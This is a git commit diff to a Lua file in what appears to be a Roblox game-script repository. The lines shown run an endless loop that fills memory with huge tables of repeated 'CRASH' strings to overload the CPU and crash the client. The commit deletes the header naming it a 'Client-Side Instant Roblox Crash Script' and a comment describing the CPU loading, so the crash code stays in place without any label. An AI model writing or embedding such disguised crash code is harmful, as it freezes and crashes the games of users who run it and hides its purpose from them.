abce677a69b5c498114dc6e75900184007a21dab
Axrex664 <axrexkiro@gmail.com>
2026-08-01 16:20:20 +0300

    Update 123974602339071.lua

--- games/123974602339071.lua
+++ games/123974602339071.lua
@@ -1,10 +1,5 @@
---========================================================================
--- Client-Side Instant Roblox Crash Script
---========================================================================
-
 task.spawn(function()
     while true do
-        -- Beşikten döngüyü kırmadan sonsuz tablo üretimi ve CPU yüklemesi
         local t = {}
         for i = 1, 100000 do
             t[i] = string.rep("CRASH", 1000)
